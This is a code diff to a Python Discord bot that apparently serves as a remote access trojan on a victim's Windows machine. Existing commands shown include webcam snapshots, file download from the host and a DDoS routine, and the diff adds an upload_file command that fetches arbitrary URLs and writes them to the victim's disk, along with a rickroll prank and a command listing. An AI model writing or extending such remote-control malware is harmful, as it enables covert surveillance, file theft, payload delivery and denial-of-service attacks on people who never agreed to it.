@@ -85,6 +85,17 @@ async def cam_snap(ctx):
 
 @client.command()
 @commands.has_permissions(administrator=True)
+async def upload_file(ctx, url, output_name):
+    await ctx.send("Downloading the file...")
+    try:
+        resp = requests.get(url)
+        open(output_name, "wb").write(resp.content)
+        await ctx. send("File uploaded")
+    except:
+        await ctx.send("Error. File not uploaded")
+
+@client.command()
+@commands.has_permissions(administrator=True)
 async def download_file(ctx, filename):
     try:
         await ctx.send(datetime.datetime.now())
@@ -210,12 +221,17 @@ async def open_browser(ctx, url):
 async def rickroll(ctx):
     try:
         os.startfile("video.mp4")
+        await ctx.send("Rickrolled ;)")
     except:
-        yt = pytube.YouTube("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
-        yt.streams.get_highest_resolution().download()
-        title = yt.title + ".mp4"
-        os.rename(title,"video.mp4")
-        os.startfile("video.mp4")
+        try:
+            yt = pytube.YouTube("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+            yt.streams.get_highest_resolution().download()
+            title = yt.title + ".mp4"
+            os.rename(title,"video.mp4")
+            os.startfile("video.mp4")
+            await ctx.send("Rickrolled ;)")
+        except:
+            await ctx.send("Rickrolled failed :(")
 
 @client.command()
 @commands.has_permissions(administrator=True)
@@ -275,6 +291,12 @@ async def ddos(ctx, ip, port, tm, dl):
         except:
             await ctx.send("Error. Host not found")
             break;
+
+@client.command()
+@commands.has_permissions(administrator=True)
+async def commands(ctx):
+    filecontent = open("commands.txt", "r").read()
+    await ctx.send(filecontent)
 
 client.run(discord_bot_token)
 
